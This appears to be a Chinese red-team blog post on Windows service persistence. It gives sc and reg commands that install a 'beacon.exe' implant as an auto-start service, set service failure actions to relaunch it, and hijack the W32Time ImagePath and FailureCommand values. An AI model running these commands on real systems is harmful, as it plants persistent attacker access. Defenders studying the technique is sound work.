---
title: Persistence New Service
date: 2023-09-13T17:39:41+08:00
draft: false
url: /posts/2023-09-14/New-Service
tags:
  - Windows
  - Persistence
  - New-Service
---

## 0x00 前言

Persistence New Service

## 0x01 New Service

### 系统服务 常用命令

#### 创建服务

~~~cmd
sc create <Service Name> binPath= "<path to executable>"

# PowerShell
New-Service -Name "<Service Name>" -BinaryPathName "<path to executable>" -Description "<Description>" -StartupType Automatic
~~~

#### 启动服务

~~~cmd
sc start <Service Name>
~~~

#### 停止服务

~~~cmd
sc stop <Service Name>
~~~

#### 删除服务

~~~cmd
sc delete <Service Name>
~~~

#### 查询服务

~~~cmd
sc query

# Usage：
sc query <Service Name>
~~~

#### 修改服务配置

~~~cmd
sc config <Service Name> <parameter>= <value>
~~~

## 0x02 利用方法

### 创建、启动服务

~~~cmd
shell sc create <Server Name> binpath= "<path to executable>" start= auto && sc.exe start <Service Name>

# Usages：
# 非服务马的情况：启动会报错，但实际上是成功的
# 创建服务，设置服务启动失败之后执行命令，启动服务（非服务马启动失败之后会触发服务启动失败执行的命令）
shell sc create <Server Name> binpath= "cmd.exe /c start /b <path to executable>" start= auto && sc failure <Server Name> command= "\"cmd.exe /c start /b <path to executable>\"" && sc start <Server Name>

shell sc create publicsrv binpath= "cmd.exe /c start /b C:\tmp\beacon.exe" start= auto && sc failure publicsrv command= "\"cmd.exe /c start /b C:\tmp\beacon.exe\"" && sc.exe start publicsrv
~~~

### 劫持路径

#### bin路径

“ ***binPath*** ”是将服务指向服务启动时需要执行的二进制文件的位置。Metasploit 框架可用于生成任意可执行文件

```cmd
# Usage
sc config <Server Name> binPath= "<path to executable>" && sc start <Server Name>

sc config Rex binPath= "C:\tmp\beacon.exe" && sc start Fax
```

#### 图像路径

“ ***ImagePath*** ”注册表项通常包含驱动程序映像文件的路径。使用任意可执行文件劫持此Key将导致有效负载在服务启动期间运行

```cmd
# Usage
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v ImagePath /t REG_SZ /d "<path to executable>"

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v ImagePath /t REG_SZ /d "C:\tmp\beacon.exe"
```

#### 失败命令

Windows 提供了一种功能，以便在服务无法启动或其通信进程终止时执行某些操作。具体来说，当服务被终止时可以执行命令。控制此操作的注册表项是“ ***FailureCommand*** ”，它的值将定义将执行的内容

```cmd
# Usage
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand /t REG_SZ /d "<path to executable>"
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand /t REG_SZ /d "C:\tmp\beacon.exe"
```

***或者，可以通过使用***  ***“sc”*** 实用程序并指定 ***“failure”*** 选项来执行相同的操作

```cmd
# Usage
sc failure <Server Name> command= "\"<path to executable>\""

sc failure Rex command= "\"C:\tmp\beacon.exe\""
```

